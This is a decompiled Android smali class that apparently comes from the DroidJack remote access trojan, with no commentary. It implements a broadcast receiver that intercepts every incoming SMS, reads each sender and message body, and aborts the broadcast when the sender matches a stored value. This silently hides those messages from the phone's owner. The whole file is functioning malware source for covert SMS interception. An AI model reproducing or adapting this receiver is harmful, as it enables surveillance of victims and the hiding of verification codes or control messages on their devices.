.class public Lnet/droidjack/server/bx;
.super Landroid/content/BroadcastReceiver;


# static fields
.field private static a:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;)V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    sput-object p1, Lnet/droidjack/server/bx;->a:Ljava/lang/String;

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 7

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "SMS Received!!!!!!!"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const/4 v2, 0x0

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    if-eqz v0, :cond_0

    :try_start_0
    const-string v1, "pdus"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/Object;

    array-length v1, v0

    new-array v5, v1, [Landroid/telephony/SmsMessage;

    const/4 v1, 0x0

    move v6, v1

    move-object v1, v2

    move v2, v6

    :goto_0
    array-length v3, v5

    if-lt v2, v3, :cond_1

    sget-object v0, Lnet/droidjack/server/bx;->a:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Lnet/droidjack/server/bx;->abortBroadcast()V

    :cond_0
    :goto_1
    return-void

    :cond_1
    aget-object v1, v0, v2

    check-cast v1, [B

    invoke-static {v1}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v1

    aput-object v1, v5, v2

    aget-object v1, v5, v2

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v3

    aget-object v1, v5, v2

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v2, 0x1

    move v2, v1

    move-object v1, v3

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    goto :goto_1
.end method
